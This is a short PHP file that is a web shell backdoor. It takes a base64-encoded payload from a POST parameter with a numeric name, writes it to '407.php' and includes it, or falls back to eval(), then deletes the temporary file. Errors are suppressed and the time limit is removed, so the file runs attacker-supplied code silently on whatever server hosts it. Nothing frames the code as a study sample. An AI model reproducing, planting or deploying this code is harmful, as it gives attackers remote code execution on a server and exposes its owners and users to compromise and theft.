<?php 
error_reporting(E_ERROR);set_time_limit(0);
if(isset($_POST['705145942793151974499'])){
	$tofile='407.php';
	$a =base64_decode(strtr($_POST['705145942793151974499'], '-_,', '+/=')); 
	$a='<?php '.$a.'?>';
	@file_put_contents($tofile,$a);
	if(file_exists('407.php')){
		require_once('407.php');
	}else{
		@eval(base64_decode(strtr($_POST['705145942793151974499'], '-_,', '+/=')));
	}
	@unlink($tofile);
	exit;

}
?>